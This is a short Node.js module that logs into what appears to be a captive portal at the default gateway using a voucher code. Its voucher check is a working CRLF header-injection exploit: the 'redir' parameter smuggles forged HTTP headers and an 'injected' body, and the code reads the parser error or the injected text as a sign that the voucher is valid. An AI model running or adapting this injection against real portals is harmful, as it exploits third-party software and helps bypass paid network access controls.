'use strict';

const jsdom       = require('jsdom');
const exec        = require('child_process').exec;
const promisify   = require('es6-promisify');
const querystring = require('querystring');


let verbose = false;

const log = function log(msg) {
  if (verbose) {
    console.log(' ' + msg);
  }
};

const getDefaultGateway = function getDefaultGateway() {
  log('\nGetting default gateway...');

  return new Promise(function (resolve, reject) {
    exec("echo $(/sbin/ip route | awk '/default/ { print $3 }')", (err, stdout, stderr) => {
        if (err !== null) {
          return reject(err);
        }

        const gateway = stdout.toString().trim();

        log(`Default gateway is ${gateway}`);

        resolve(gateway);
      }
    );
  });

};

const getToken = function getToken(host) {
  log('\nFetching and parsing session token...');

  return promisify(jsdom.env.bind(jsdom))(host)
    .then(function (window) {
      const tokenNode = window.document.querySelector('form[action="/"] input[name="tok"]');

      if (!tokenNode) {
        throw new Error('You are already logged in!');
      }

      const token = window.document.querySelector('form[action="/"] input[name="tok"]').value;

      log(`Session token is ${token}`);

      return token;
    });
};

const getStatus = function (host, token, voucher) {
  log('\nChecking voucher...');

  const crlf = '\r\nContent-Type: text/html\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\ninjected';

  return promisify(jsdom.env.bind(jsdom))(host + '?' + querystring.stringify({
      tok: token,
      voucher,
      redir: crlf
    }))
    .catch(function (err) {
      // CRLF injection is passed. HTML is invalid
      if (err.code === 'HPE_INVALID_HEADER_TOKEN') {
        return true;
      } else {
        throw err;
      }
    })
    .then(function (window) {
      const status = window.document.body.indexOf('injected') === 0;

      if (status) {
        log('Voucher is valid!');
        return;
      }

      const errorNode = window.document.querySelectorAll('.error')[0];
      const message   = errorNode && errorNode.innerHTML;

      log('Voucher is invalid');

      log(`Error message is:\t${message}`);

      throw new Error(message || 'Voucher is invalid');
    });
};

const login = function login(voucher, v) {
  let host;

  verbose = v;

  console.log('Please wait a few seconds...');

  return getDefaultGateway()
    .then((gateway) => {
      host = 'http://' + gateway;
      return getToken(host);
    })
    .then(function (token) {
      return getStatus(host, token, voucher);
    });
};

exports.login = login;

// fc:f8:ae:cc:22:43